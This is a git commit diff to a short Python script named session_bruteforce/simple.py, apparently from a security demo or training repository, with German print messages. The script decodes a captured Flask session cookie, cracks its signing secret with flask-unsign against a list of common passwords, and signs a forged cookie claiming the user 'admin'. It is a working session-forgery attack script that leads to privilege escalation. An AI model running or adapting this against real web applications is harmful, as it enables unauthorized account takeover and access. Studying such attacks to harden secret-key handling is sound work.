0d0d41fadcff564138df9062c9042fc94dd1e9af
NewSecurityAdvisor <146943220+NewSecurityAdvisor@users.noreply.github.com>
2024-07-01 14:13:13 +0200

    wordlist add

--- session_bruteforce/simple.py
+++ session_bruteforce/simple.py
@@ -5,12 +5,12 @@ import flask_unsign_wordlist
 found_cookie = "eyJjc3JmX3Rva2VuIjoiZTNmYjhhNGRkZWIzM2QwOGMxODBlZDQzNDQ3OTdiYjk1MDRmYzg4MiIsIm5hbWUiOiJ0ZXN0In0.Zn22vQ.Dz-xmi6dTHo_DnATkQ_Z9Ch3zAs"
 
 cookie_result = subprocess.run(['flask-unsign', '--decode', '--cookie', found_cookie], capture_output=True, text=True)
-print("Der Inhalt aus dem dekodiertem Cookie: ", cookie_result.stdout)
+print("Decodierter Cookie: ", cookie_result.stdout)
 
-secret = subprocess.run(['flask-unsign', '--unsign', '--cookie', found_cookie, '--wordlist', './5.txt', '--no-literal-eval'], capture_output=True, text=True)
+secret = subprocess.run(['flask-unsign', '--unsign', '--cookie', found_cookie, '--wordlist', './10k-most-common.txt', '--no-literal-eval'], capture_output=True, text=True)
 secret_key = secret.stdout
-print("Das geknackte Secret: ", secret_key)
+print("Secret: ", secret_key)
 
-cookie_content= "{'name': 'Admin'}"
+cookie_content= "{'name': 'admin'}"
 crafted_cookie = subprocess.run(['flask-unsign', '--sign', '--cookie', cookie_content, '--secret', secret_key], capture_output=True, text=True)
-print("Selbst signierte Cookie: ", crafted_cookie.stdout)
+print("Selbst signierter Cookie: ", crafted_cookie.stdout)
